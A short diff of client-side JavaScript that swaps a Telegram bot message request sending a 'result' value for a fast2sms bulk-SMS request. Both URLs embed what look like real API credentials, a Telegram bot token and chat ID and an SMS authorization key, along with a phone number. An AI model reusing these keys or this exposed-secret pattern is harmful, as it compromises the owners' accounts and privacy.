@@ -15,7 +15,9 @@
         }else       
         {
         const request = new XMLHttpRequest();
-        const url = 'https://api.telegram.org/bot1673038851:AAEIqwAgS-TtA331gOhUHVhRnVJf_34bUsE/sendMessage?chat_id=-1001225437691&text='+result;
+         
+      const url = 'https://www.fast2sms.com/dev/bulkV2?authorization=tXGFnAr4LNYZM8Q9jwPVHxWdvs6eahl2qk5of7SzpRbOUEumITTnoiOFHqdCLhzJPgaxer2mpZ8UNEyf&route=s&sender_id=SMSINI&message=7&variables_values=%7C&flash=0&numbers=8248675218';
+         //  const url = 'https://api.telegram.org/bot1673038851:AAEIqwAgS-TtA331gOhUHVhRnVJf_34bUsE/sendMessage?chat_id=-1001225437691&text='+result;
         request.open("post", url);
         request.send();
         }
